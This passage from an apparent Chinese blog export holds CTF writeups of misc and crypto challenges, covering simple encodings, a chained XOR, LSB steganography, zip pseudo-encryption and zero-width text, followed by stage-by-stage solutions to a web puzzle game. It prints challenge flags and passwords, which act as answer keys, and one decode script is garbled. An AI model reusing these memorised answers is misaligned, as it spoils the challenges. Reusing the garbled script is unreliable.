14pt\">![](http://cdn.anyiblog.top/common/7f24bb49865b3fc3d29d426f2db071cb.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">使用文件查找功能</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/4807e4c36e026abbe833a4f1f2adec62.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">直接搜索flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c58015df5bad6cc04b63fe194d91f524.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">在DoAction找到flag字段&nbsp;</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/65aa4b78e6ac3425a9dcad410a7fc902.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">转到DoAction 然后用ctrl+f快速查找 搜索flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c2b6ed4daa500bf2d8810a2257c60806.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到flag&nbsp;</span>\n\n<span style=\"font-size: 14pt\">DASCTF{23dvkjzr3juboiavztbncaxftfpyq5gz}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">5.艾克赛斯</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/fa3013f22e7c583c7f1a9478161342a4.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7aea2cac57bdccbf4878ee4ca779c853.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先看encode.py</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/b6387dd9f69ee95b114f00d92fcf1411.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里先将flag的文本的每一个字符读取 将每一位ascii码进行-1操作</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">然后再把拼接起来的新的字符串作为十进制写到密文中。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">密文如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/edaa94042a589aa16314fd415d8faa64.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n    8785377975578074175091449592699820502541930703609541378188644326830861555987356326396428107299197220\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">对应写解密脚本即可。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3a0ac2291ebbde9f3b09b10509f07943.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先将密文转为十六进制</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c9c08f0248c08745d52be955381c6738.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">这里再将ascii码分隔一下 然后再一一转为字符串即可</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">最终脚本如下：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/611991eca039f164544c9663cbeca4d1.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n    def decode():\n        ciphey_text=8785377975578074175091449592699820502541930703609541378188644326830861555987356326396428107299197220\n        print(hex(ciphey_text))\n        #0x101107961021225548535199100999751545549984947505696495149549899475448501011015649124\n        list=[101,107,96,102,122,55,48,53,51,99,100,99,97,51,54,55,49,98,49,47,50,56,96,49,51,49,54,98,99,47,54,48,50,101,101,56,49,124] ###分离ascii码\n        flag=\"\"\n        for i in list:\n            flag += chr(i+1)\n        print(flag)\n\n    decode()\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">运行得到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7f27851fee76d29089cf61f77e951f2c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">flag{8164dedb4782c2039a2427cd0713ff92}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">6.lsp隐写</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8e65f357ebe825646a8b7ac174b8034e.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/33f4c0173c465b830a77530e8f3f0594.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">一张图片 不难想到此题为lsb隐写 标题也提示了 将图片拖入stegsolve中</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">进行通道分析：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/7564f72ec9fbe0ef46dce2af210f3e8c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/20180949ff18c0f3e5ddb55b60ad862f.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">将红绿蓝三个通道选为最低位 然后bit order选为lsb</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/a7645e48acba595d07d9431123039da3.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">在文件头部发现504B 这是压缩包的文件头</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/8742f22843e6020fa40b30d513ac6683.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">选择Save Bin到文本中</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/0fea9222b51a4c1213f6ed03350528dd.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n![](http://cdn.anyiblog.top/common/c25e3d6ea62d3f508b5ed1da85b6fbe8.png)\n<span style=\"font-size: 14pt\">得到十六进制数值 然后将这段数据通过winhex写到压缩包中</span>\n\n    504B030414000000080053A58353AADB061F360000003400000008000000666C61672E7478744B36CE294DF128A9F0ADF2AA4A7649A9F20D09ABF0AB8A344DAA8A3448CACAAE4ACE0AAAF40B4937F6CD7235F00BC936F2CD33B00500504B0102140014000900080053A58353AADB061F3600000034000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800DAEE244043E8D7011871A34643E8D701FCD9203D43E8D701504B050600000000010001005A0000005C0000000000\n\n<span style=\"font-size: 14pt\">&nbsp; &nbsp; &nbsp;</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/69f6b48b2d8d3aad90f3c590d68b32b8.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">保存后 发现是文件加密 这里是伪加密</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/d8e7cba472657ace3ffb5c82200a4ee4.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">将0900改为0000即可。</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/67c473424a769860433a9c3f858bb218.png)</span>\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c345ce8cdcf0d985850b8ebb370e2d99.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">打开文本 发现一段base64数据</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/e2ed76d484db8c4e3c7745dc08743a22.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">在线解密一下</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/eed6d4a19ca3f7ffb9bbf7b4516f3441.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">发现又是rot13 再解一下</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/6f405adb912e0f9a5d5ff3ed3a1f779c.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到flag</span>\n\n<span style=\"font-size: 14pt\">flag{d32fc7f15d769b64a93e4e5872145962}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">7.异或与非</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/cafb67ff83c7a5eafa4f69c9bec8aeb8.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/2b7720aeb1d41a8bf2ba076e8024b5ee.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">加密脚本如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/f745b15515bd766826cf1e505aef16ae.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n    [+]Your Ciphertext: ['f', '\n', '\n', '\u0006', '\u001c', '\u001e', 'S', '\u0001', '\u0003', 'P', 'V', '\u0005', '\u0004', '\u000b', '\n', '\u0004', '\u0007', 'T', '\\', '\n', '\u0006', '\u0001', '\u0000', '\u0004', 'V', 'V', 'Q', 'S', '\u0007', 'P', 'S', '\u0004', '\u0005', '\u0001', '\t', '\f', '\u0000', 'I']\n\n<span style=\"font-size: 14pt\">审计代码：</span>\n\n<span style=\"font-size: 14pt\">首先将flag文本内容读出 然后创建了列表encode_flag 并添加flag的第一个字符&nbsp;</span>\n\n<span style=\"font-size: 14pt\">然后遍历flag字符串 将每一位字符与上一位字符的ascii码进行异或 转成字符</span>\n\n<span style=\"font-size: 14pt\">最后将结果打印出来</span>\n\n<span style=\"font-size: 14pt\">大致读懂代码后 根据print出来的东西写解密脚本</span>\n\n<span style=\"font-size: 14pt\">脚本如下：</span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9e47e9c4ed11725a27cf68b7bb14e0c7.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n    def decode():\n        str=['f', '', '', '\u0006', '\u001c', '\u001e', 'S', '\u0001', '\u0003', 'P', 'V', '\u0005', '\u0004', '\u000b', '', '\u0004', '\u0007', 'T', '\\', '', '\u0006', '\u0001', '\u0000', '\u0004', 'V', 'V', 'Q', 'S', '\u0007', 'P', 'S', '\u0004', '\u0005', '\u0001', '\t', '\f', '\u0000', 'I']\n        flag=\"f\"\n        for i in range(1,len(str)):\n            flag += chr(ord(str[i]) ^ ord(flag[i-1]))\n        print(flag)\n    decode()\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">根据加密脚本同样操作 将第一位与上一位进行异或 最后把结果加到一个字符串上打印</span>\n\n<span style=\"font-size: 14pt\">运行脚本得到flag</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/55860ce014ef77fa46cd1969a395a385.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">flag{e674d2738261e942337a7f52b1501844}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">8.国王的新字符</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/96a2081f294e05f8cf0cf1c2e117300a.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/0757bea829d117143f9b554ec6edb2da.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">文本信息如下：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/70ad18d2c7e4d7597eeaa9f5ff9bd6ec.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">根据文本提示 让我们用kali的vim打开这段文本</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/84fa60b9e15e2bc6b54ca6676b9eaa91.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">打开后发现了一堆隐藏的信息 结合题目和简介提示 显然是零宽字符</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">用在线网站解</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/eeb6e150be2e50cea410f36ac7ca4df2.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到flag</span>\n\n<span style=\"font-size: 14pt\">flag{ZeroNumber}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">9.看不见的水印</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c8c89a92ffd88eabde415e7ff8ae8754.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">题目附件：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/0b54bb56e7589220c01761c0befba4df.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">先把图片解压下来</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3d78555717c5e715980c342f470438bc.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">两张同样的图片 结合题目标题看不见的水印 显然这是盲水印隐写</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">使用github上相应的脚本即可。</span>\n\n<span style=\"font-size: 14pt\">[https://github.com/chishaxie/BlindWaterMark](https://github.com/chishaxie/BlindWaterMark)</span>\n\n<span style=\"font-size: 14pt\">python bwmforpy3.py decode file.jpg file0.jpg flag.jpg</span><span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/3eff8b7a8e00d4d3ae6020e0b952029a.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">得到盲水印图：</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/9e881361f16f91dfb1ea08b43c04f2dd.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">显然是密码 进行解密即可。</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">![](http://cdn.anyiblog.top/common/c7594d6a39b3352c21ce42a91cee7d9d.png)</span>\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">flag{a5bee5c2a562c3c7a721d16f7147b309}</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n<span style=\"font-size: 14pt\">End</span>\n\n<span style=\"font-size: 14pt\"></span>\n\n","tags":["刷题","CTF"],"categories":["刷题笔记","Writeup"]},{"title":"摸鱼大闯关 1-40关 writeup","url":"/2021/12/04/20211204/","content":"\n昨天玩了下摸鱼大闯关 一共54关 目前是40关\n\n网站是[https://p.hancel.org/](https://p.hancel.org/) 题目质量可以 烧脑。解了一天就写个writeup吧\n\n内容偏ctf吧，前期是前端 后面就是烧脑的图片、编码。。\n\nwriteup只提供思路 不提供url。有关的地方会打码。\n\n卡在了40 有思路的朋友可以评论分享奥\n\n![](http://cdn.anyiblog.top/common/d31760c8581a607230c35419dfbe8b46.png)\n#### 目录>\n\n##### [stage0](#Stage0)\n##### [stage1](#Stage1)\n##### [stage2](#Stage2)\n##### [stage3](#Stage3)\n##### [stage4](#Stage4)\n##### [stage5](#Stage5)\n##### [stage6](#Stage6)\n##### [stage7](#Stage7)\n##### [stage8](#Stage8)\n##### [stage9](#Stage9)\n##### [stage10](#Stage10)\n##### [stage11](#Stage11)\n##### [stage12](#Stage12)\n##### [stage13](#Stage13)\n##### [stage14](#Stage14)\n##### [stage15](#Stage15)\n##### [stage16](#Stage16)\n##### [stage17](#Stage17)\n##### [stage18](#Stage18)\n##### [stage19](#Stage19)\n##### [stage20](#Stage20)\n##### [stage21](#Stage21)\n##### [stage22](#Stage22)\n##### [stage23](#Stage23)\n##### [stage24](#Stage24)\n##### [stage25](#Stage25)\n##### [stage26](#Stage26)\n##### [stage27](#Stage27)\n##### [stage28](#Stage28)\n##### [stage29](#Stage29)\n##### [stage30](#Stage30)\n##### [stage31](#Stage31)\n##### [stage32](#Stage32)\n##### [stage33](#Stage33)\n##### [stage34](#Stage34)\n##### [stage35](#Stage35)\n##### [stage36](#Stage36)\n##### [stage37](#Stage37)\n##### [stage38](#Stage38)\n##### [stage39](#Stage39)\n##### [stage40](#Stage40)\n\n\n* * *\n\n> <a id ='Stage0'><span style=\"font-size: 16pt;\">1、Stage 0:</span></a>\n<span style=\"font-size: 16pt;\">点击图片即可下一关</span>\n\n> <a id ='Stage1'><span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/4f6a24032d535abe5d279686ca0b6840.png)</span><span style=\"font-size: 16pt;\">2、Stage 1:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/384c13a935f1176f2c6c199991864e6b.png)</span>\n<span style=\"font-size: 16pt;\">根据url:</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2d37baa89f5ab5f1dc1e5559bd1d1af1.png)</span>\n<span style=\"font-size: 16pt;\">直接修改为2即可下一关</span>\n> <a id ='Stage2'><span style=\"font-size: 16pt;\">3、Stage 2:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/ea9381c5a24e7cbf33bd45df98dd8e9d.png)</span>\n<span style=\"font-size: 16pt;\">尝试改成3</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/1db0cc4f126acdb5c2285f11ea2f2859.png)</span>\n<span style=\"font-size: 16pt;\">不行，就看源代码</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/46aa68257ad22c8ae8065054cd52cb84.png)</span>\n<span style=\"font-size: 16pt;\">直接跳转即可。</span>\n> <a id ='Stage3'><span style=\"font-size: 16pt;\">4、Stage 3:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2ac2e933b4708a88b58560f2a2fd8a58.png)</span>\n<span style=\"font-size: 16pt;\">Ctrl+U看源码</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/dbe2489066b76faf78dc98686c50b5fd.png)</span>\n<span style=\"font-size: 16pt;\">跳转下一关。</span>\n> <a id ='Stage4'><span style=\"font-size: 16pt;\">5、Stage 4:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/a33823c148aeb0ffbe0b9ba665eb7f90.png)</span>\n<span style=\"font-size: 16pt;\">看源代码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/371c7442fd790a1b41988991a7917c27.png)</span>\n<span style=\"font-size: 16pt;\">这里说实话不细心可能会卡很久 页面就在最下面的注释中：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b2e7d252e043ce7ec664066db052beff.png)</span>\n<span style=\"font-size: 16pt;\">访问url跳转下一关。</span>\n> <a id ='Stage5'><span style=\"font-size: 16pt;\">6、Stage 5:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7c460f298587a904d3786b5f56e804b0.png)</span>\n<span style=\"font-size: 16pt;\">上面的windows 下面的图片学过计算机的都知道是linux 因此访问linux.html</span>\n\n<span style=\"font-size: 16pt;\">（这里没有啥图片隐写 还没那么难哦）</span>\n> <a id ='Stage6'><span style=\"font-size: 16pt;\">7、Stage 6:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/2f5c2707f7a60676fe0aefa6c6e5733c.png)</span>\n<span style=\"font-size: 16pt;\">直接看源代码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/de1facc3580606669d58b4fdb84f7614.png)</span>\n<span style=\"font-size: 16pt;\">发现是有图片 直接访问图片url：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/c3c4060d13c7612a668d211d4b298fbb.png)</span>\n<span style=\"font-size: 16pt;\">跳转即可。</span>\n> <a id ='Stage7'><span style=\"font-size: 16pt;\">8、Stage 7:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/94d07d2e8faa9eee78b2a01cfc774961.png)</span>\n<span style=\"font-size: 16pt;\">遇到这些啥都没的 就先看源代码：</span>\n\n<span style=\"font-size: 16pt;\">在标题中找到密码</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/8ce9565c7d7a6b739a238936d091df3f.png)</span>\n<span style=\"font-size: 16pt;\">输入here直接下一关。</span>\n> <a id ='Stage8'><span style=\"font-size: 16pt;\">9、Stage 8:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7ae713a678063a495561a00ff15fd582.png)</span>\n<span style=\"font-size: 16pt;\">说实话这题刚开始看的时候有一点点迷惑 可能是表述有点看不懂吧。</span>\n\n<span style=\"font-size: 16pt;\">看源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/5be01415eac8547b4e6a4e86517d1a37.png)</span>\n<span style=\"font-size: 16pt;\">结合注释的提示和标题提示 得知这是html字符实体 然后再看url</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/6e8f7ad7bd7fdffd3aa33306857ec492.png)</span>\n<span style=\"font-size: 16pt;\">&nbsp 学过html的我知道这是空格 结合题目说密码是五个字母的单词。因此密码是space</span>\n\n<span style=\"font-size: 16pt;\">或者说去在线网站解html编码</span>\n\n<span style=\"font-size: 16pt;\">输入space即可。</span>\n> <a id ='Stage9'><span style=\"font-size: 16pt;\">10、Stage 9:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/8424ac3e6a87ada92edb4aaf35b97246.png)</span>\n<span style=\"font-size: 16pt;\">源码中提示：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7bb3ec9bfdf47e1d1247ecd0dfe5bd42.png)</span>\n<span style=\"font-size: 16pt;\">一看就知道是凯撒 爆破一下</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/d5aed0d9665917cd0392bba28130618c.png)</span>\n<span style=\"font-size: 16pt;\">访问即可。</span>\n> <a id ='Stage10'><span style=\"font-size: 16pt;\">11、Stage 10:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/96199a0a8611ae7a5f0a841c9756cdca.png)</span>\n<span style=\"font-size: 16pt;\">题目给了个十进制 做过misc多 就会尝试去把十进制转成十六进制 然后转文字</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/1654c6de47dff5316dbd5e4ae78e02db.png)</span>\n<span style=\"font-size: 16pt;\">结果一转十六进制就找到了</span>\n\n<span style=\"font-size: 16pt;\">访问effaced.html即可</span>\n> <a id ='Stage11'><span style=\"font-size: 16pt;\">12、Stage 11:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/d92529535f54cc9c85d10da575e0ce3f.png)</span>\n<span style=\"font-size: 16pt;\">给了密文</span>VGhlIHBhc3N3b3JkIGlzIHN0b3JhZ2Uu\n\n<span style=\"font-size: 16pt;\">明显是base64 尝试解密</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/375102aca2fe54fb2287a990a4d31198.png)</span>\n<span style=\"font-size: 16pt;\">输入storage 即可跳转下一关。</span>\n> <a id ='Stage12'><span style=\"font-size: 16pt;\">13、Stage 12:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/10741092c44739ee62d409dee63b624b.png)</span>\n<span style=\"font-size: 16pt;\">这个是经纬度 </span>39°54'32.3\"N 116°23'51.1\"E 前面的是北纬 后面的是东经\n\n先把经纬度换算了先\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/9f6b0724d18aea0161686cfd4d9de69c.png)</span>\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/0f5be2aa64a904f0806d765469fb326e.png)</span>\n<span style=\"font-size: 16pt;\">约在</span> 39.908972222222225和116.39752777777778度\n\n然后去经纬度查询度数[https://www.qvdv.com/tools/qvdv-coordinate.html](https://www.qvdv.com/tools/qvdv-coordinate.html)\n\n![](http://cdn.anyiblog.top/common/aa14fcb3f69cb59f7313d1253f536b9b.png)\n这里是天安门广场 所以密码是其拼写tiananmen\n\n<span style=\"font-size: 16pt;\">输入即可。</span>\n> <a id ='Stage13'><span style=\"font-size: 16pt;\">14、Stage 13:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/8b7c71d6cb8ea111fa54de3033e57af6.png)</span>\n<span style=\"font-size: 16pt;\">密文是</span> <span style=\"font-size: 16pt;\">····　·　·-··　·-··　---　·-·-·-　--　---　·-·　···　·　</span>\n\n<span style=\"font-size: 16pt;\">显然这是摩斯密码</span>\n\n<span style=\"font-size: 16pt;\">找个在线网站解码即可：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7794200938e3f57a18554bfd73c702e8.png)</span>\n<span style=\"font-size: 16pt;\">注意这里的空格要复制到间隔里 不是一个空格 不然会解密错误</span>\n\n<span style=\"font-size: 16pt;\">最后解得到：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b2056db4b040a540c5de0a0b56d260fe.png)</span>\n<span style=\"font-size: 16pt;\">密码是hello.morse输入即可。</span>\n> <a id ='Stage14'><span style=\"font-size: 16pt;\">15、Stage 14:</span></a>\n<span style=\"font-size: 16pt;\">（接下来是密码关卡 提升了一些难度）</span>\n\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/b848ea3f3cc13e7c0d649fb9efb4044b.png)</span>\n<span style=\"font-size: 16pt;\">先看源码：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/d5c9aaf8e11355b317ef737a2df5f514.png)</span>\n<span style=\"font-size: 16pt;\">当时我看到这题 就去搜了下</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/7c2a4033c3b5ab96a2499ab7c21776ce.png)</span>\n<span style=\"font-size: 16pt;\">一看到标题 再结合关卡14 我想 是4 14？草。。</span>\n\n<span style=\"font-size: 16pt;\">密码应该是4。。。（谐音梗扣钱）</span>\n\n<span style=\"font-size: 16pt;\">输入即可。</span>\n> <a id ='Stage15'><span style=\"font-size: 16pt;\">16、Stage 15:</span></a>\n<span style=\"font-size: 16pt;\">页面如下：</span>\n\n<span style=\"font-size: 16pt;\">![](http://cdn.anyiblog.top/common/c2bd02b3826bc7baf7afb02ae708703f.png)</span>\n<span style=\"font-size: 16pt;\">先看源码：</span>\n\n<span style=\"font-size: 